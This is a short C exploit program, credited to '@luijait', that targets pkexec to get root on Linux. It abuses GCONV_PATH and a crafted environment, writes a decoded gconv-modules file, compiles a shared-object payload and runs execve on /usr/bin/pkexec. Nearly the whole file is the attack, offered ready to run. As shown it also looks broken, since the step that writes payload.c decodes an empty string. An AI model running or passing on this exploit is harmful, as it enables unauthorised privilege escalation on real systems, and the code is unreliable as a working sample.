#include <unistd.h>
#include <stdio.h>
void banner()
{
setvbuf (stdout, NULL, _IONBF, 0);
printf("Exploit written by @luijait");
}

int main(int argc, char **argv)
{
banner();
system("mkdir 'GCONV_PATH=.' && touch 'GCONV_PATH=./tmp' && chmod +x 'GCONV_PATH=./tmp'");
system("mkdir tmp;echo | base64 -d > tmp/payload.c; gcc tmp/payload.c -o tmp/pwnkit.so -shared -fPIC ");
system("echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d > tmp/gconv-modules");
char * const args[] = {
NULL
};
char * const entorno[] = {"pwnkit.so:.", "PATH=GCONV_PATH=.", "SHELL=/random", "CHARSET=PWNKIT","GIO_USE_VFS=",NULL};
	printf("\n[+] Enjoy your root if exploit was completed succesfully\n");
	return execve("/usr/bin/pkexec", args, entorno);
}
